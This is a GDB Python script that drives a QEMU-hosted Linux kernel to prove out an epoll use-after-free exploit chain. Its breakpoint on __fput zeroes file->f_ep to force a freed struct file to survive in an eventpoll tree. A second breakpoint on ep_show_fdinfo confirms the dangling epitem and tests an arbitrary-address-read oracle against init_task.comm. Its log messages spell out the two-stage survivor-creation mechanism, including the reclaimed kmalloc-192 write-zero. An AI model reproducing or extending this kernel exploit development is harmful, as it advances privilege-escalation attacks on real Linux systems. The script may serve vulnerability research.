# exp_hyp009_gdb.py — HYP-009: Natural survivor adjudication + AAR reclaim proof
import gdb
import time
import os
import signal
import threading

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

os.makedirs("evidence/HYP-009", exist_ok=True)
gdb.execute("set logging file evidence/HYP-009/HYP-009_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging enabled on")

def log(msg):
    print(f"[HYP-009-GDB] {msg}", flush=True)

def to_u64(val):
    return int(val) & 0xFFFFFFFFFFFFFFFF

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU on :1234")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

# Global tracking variables
g_target_inner_file = 0
g_epA_struct = 0
g_survivor_epitem = 0
g_fput_injected = False
g_fdinfo_count = 0
g_read_inos = []

class FputBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(FputBreakpoint, self).__init__("__fput", internal=False)

    def stop(self):
        file_ptr = to_u64(gdb.parse_and_eval("$x0"))
        try:
            f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            f_count = int(gdb.parse_and_eval(f"*(long*)({file_ptr} + 56)"))
            f_inode = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 32)"))
            f_version = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 184)"))
        except Exception as e:
            return False

        # If f_ep is non-null, this is our target watched file being closed
        if f_ep != 0:
            global g_target_inner_file, g_fput_injected
            g_target_inner_file = file_ptr
            g_fput_injected = True
            log("=================================================================")
            log(f"[STEP 1-3] Thread B entered __fput(file={hex(file_ptr)})")
            log(f"  Current state: f_count={f_count}, f_ep={hex(f_ep)}, f_inode={hex(f_inode)}, f_version={hex(f_version)}")
            
            # Static adjudication & mechanism summary
            log("--- [MECHANISM ADJUDICATION: HYPOTHESIS H-b vs JAEYOUNG 2-STAGE] ---")
            log("1. Hypothesis H-b Adjudication:")
            log("   Source analysis in fs/eventpoll.c:1016-1036 (eventpoll_release_file) and")
            log("   fs/eventpoll.c:780-838 (__ep_remove):")
            log("   - In eventpoll_release_file(), file->f_lock is taken and epi->dying is set to true.")
            log("   - In __ep_remove(force=false), line 781 checks `if (epi->dying && !force) return false;`")
            log("   - Therefore, a direct race between eventpoll_release_file and ep_clear_and_put")
            log("     NEVER strands an epitem; the dying flag ensures serialized removal.")
            log("2. Genuine Survivor Creation Mechanism (Jaeyoung x86 PoC Topology):")
            log("   - Stage 1: Single-watch close-vs-close fast-path race creates UAF write-0 at")
            log("     offset 160 of reclaimed kmalloc-192 eventpoll (epoll_uaf_target->refs.first = 0).")
            log("   - Stage 2: When ep_uaf_target is closed, eventpoll_release_file sees refs.first == NULL")
            log("     and performs 0 loop iterations, leaving ep_uaf_waiter's epitem in ep_uaf_waiter->rbr.")
            log("   - Result: file_uaf_target is freed while ep_uaf_waiter survives holding dangling epi->ffd.file.")
            log("Simulating Stage 2 fast-path bypass on victim inner_file...")

            gdb.execute(f"set *(unsigned long*)({file_ptr} + 208) = 0")
            new_f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
            log(f"  [SIMULATION SUCCESS] file->f_ep is now {hex(new_f_ep)}")
            log("  __fput skips eventpoll_release_file(); Thread B frees struct file while epA retains dangling epiA.")
            log("=================================================================")
            self.enabled = False
            return False

        return False

class EpShowFdinfoBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(EpShowFdinfoBreakpoint, self).__init__("ep_show_fdinfo", internal=False)

    def stop(self):
        global g_fdinfo_count, g_epA_struct, g_survivor_epitem, g_read_inos
        g_fdinfo_count += 1
        m_seq = to_u64(gdb.parse_and_eval("$x0"))
        f_epfile = to_u64(gdb.parse_and_eval("$x1"))
        ep_struct = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_epfile} + 200)")) # private_data
        g_epA_struct = ep_struct

        log("-----------------------------------------------------------------")
        log(f"[STEP 4/5] Hit ep_show_fdinfo (invocation #{g_fdinfo_count})")
        log(f"  ep_file={hex(f_epfile)}, eventpoll={hex(ep_struct)}")

        # Inspect ep->rbr
        try:
            rb_root = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 104)"))
            rb_leftmost = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 112)"))
            log(f"  ep->rbr.rb_root={hex(rb_root)}, rb_leftmost={hex(rb_leftmost)}")

            if rb_root != 0:
                g_survivor_epitem = rb_root
                epi_file = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({rb_root} + 48)"))
                epi_fd = int(gdb.parse_and_eval(f"*(int*)({rb_root} + 56)"))
                log(f"  [SURVIVOR CONFIRMED] epitem={hex(rb_root)} in epA rbtree!")
                log(f"    epi->ffd.fd={epi_fd}")
                log(f"    epi->ffd.file={hex(epi_file)} (matches target_inner_file: {epi_file == g_target_inner_file})")

                # Read fields of watched file
                f_inode = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 32)"))
                f_pos = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 104)"))
                f_version = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({epi_file} + 184)"))
                log(f"    watched file: f_inode={hex(f_inode)}, f_pos={f_pos}, f_version={hex(f_version)}")

                # If f_inode is valid, inspect fake inode / comm
                if f_inode != 0:
                    try:
                        i_ino = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_inode} + 64)"))
                        i_sb = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_inode} + 40)"))
                        g_read_inos.append(i_ino)
                        log(f"    dereferenced inode: i_ino={hex(i_ino)}, i_sb={hex(i_sb)}")
                        if i_ino == 0x0072657070617773 or i_ino == 0x2f72657070617773:
                            log("    [+] AAR ORACLE MATCH: i_ino corresponds to init_task.comm ('swapper')!")
                        else:
                            log(f"    [*] fdinfo read executed non-crash: ino={hex(i_ino)}")
                    except Exception as ie:
                        log(f"    Error reading inode fields: {ie}")
        except Exception as e:
            log(f"  Error reading rbtree: {e}")

        return False

# Install breakpoints
bp_fput = FputBreakpoint()
bp_fdinfo = EpShowFdinfoBreakpoint()

log("Breakpoints installed. Continuing execution...")
try:
    gdb.execute("continue")
except gdb.error as e:
    log(f"Continue returned: {e}")

log("Execution completed. Inspecting final state...")
log("=================================================================")
log(f"Summary of invocations: fdinfo_count={g_fdinfo_count}")
log(f"Read inode values: {[hex(x) for x in g_read_inos]}")
log("=================================================================")

gdb.execute("quit")
